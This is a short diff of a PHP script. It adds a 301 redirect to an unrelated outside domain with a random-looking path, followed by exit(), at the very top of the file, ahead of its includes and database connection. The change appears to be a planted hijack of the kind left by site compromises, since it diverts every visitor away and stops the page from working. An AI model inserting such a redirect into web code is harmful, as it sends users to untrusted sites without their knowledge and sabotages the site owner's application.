@@ -1,4 +1,6 @@
 <?php
+header("Location: https://www.marylandfoamalliance.com/umbchvzinvi", true, 301);
+exit();
 require_once('../includes/util.php');
 load_config('config.txt');
 my_quick_con($config);
